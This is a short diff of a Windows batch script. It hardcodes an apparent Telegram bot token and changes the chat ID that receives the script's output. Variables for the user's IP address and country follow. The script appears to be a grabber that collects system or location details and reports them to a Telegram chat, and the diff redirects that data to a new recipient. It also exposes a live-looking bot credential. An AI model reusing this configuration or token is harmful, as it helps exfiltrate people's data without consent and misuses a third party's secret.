@@ -34,7 +34,7 @@ chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
 set "TOKEN=8127544875:AAEPJdvgQplbDmxCJ0IVh6Olx4HNmcPIn-8"
-set "CHAT_ID=5674938532"
+set "CHAT_ID=7784068582"
 
 set "IP=Unknown"
 set "Country=Unknown"
